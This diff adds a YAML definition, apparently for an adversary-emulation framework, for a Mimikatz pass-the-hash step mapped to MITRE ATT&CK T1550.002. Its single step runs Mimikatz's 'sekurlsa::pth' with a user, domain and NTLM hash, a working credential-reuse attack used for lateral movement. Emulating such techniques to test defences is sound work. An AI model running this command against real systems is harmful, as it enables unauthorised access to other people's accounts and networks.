@@ -1,0 +1,38 @@
+api_version: "2.0"
+name: Mimikatz Pass the Hash
+description: |
+    Note: must dump hashes first
+    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+args:
+    - name: user_name
+      type: string
+      default: Administrator
+    - name: ntlm
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+    - name: domain
+      type: string
+      default: '%userdnsdomain%'
+    - name: mimikatz_path
+      type: path
+      default: '%tmp%\mimikatz\x64\mimikatz.exe'
+uuid: ec23cef9-27d9-46e4-a68d-6f75f7b86908
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0008: Lateral Movement'
+    techniques:
+        - 'T1550: Use Alternate Authentication Material'
+    subtechniques:
+        - 'T1550.002: Pass the Hash'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: mimikatz-pass-the-hash
+      inline: |
+        {{.Args.mimikatz_path}} "sekurlsa::pth /user:{{.Args.user_name}} /domain:{{.Args.domain}} /ntlm:{{.Args.ntlm}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
